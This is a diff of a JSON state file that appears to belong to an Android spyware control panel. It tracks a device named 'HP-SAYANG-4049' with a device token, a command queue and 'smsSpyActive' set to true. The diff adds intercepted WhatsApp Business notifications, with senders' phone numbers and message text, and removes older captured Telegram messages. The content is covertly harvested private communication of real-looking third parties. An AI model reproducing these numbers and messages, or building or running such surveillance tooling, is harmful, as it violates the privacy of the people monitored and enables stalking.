@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633596725,
+    "lastSeen": 1775633602730,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "taruu di gb ajaaa",
+        "time": "08/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633604988
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Pp",
+        "time": "08/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633604742
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎16 pesan dari 3 chat",
+        "time": "08/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633598023
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 838-1173-3694",
+        "content": "Plenger ga jawab",
+        "time": "08/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633598011
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "taruu di gb ajaaa",
+        "time": "08/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633597947
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Pp",
+        "time": "08/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633597825
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
@@ -4278,54 +4326,6 @@
         "time": "08/04 14:16",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632576789
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "10 new messages from 10 chats",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632576608
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632575122
-      },
-      {
-        "appName": "Telegram",
-        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
-        "content": "enggaa",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632575087
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Bank pakai 08",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632575027
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "12 new messages from 11 chats",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632574901
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632572757
       }
     ],
     "galleryPhotos": [],
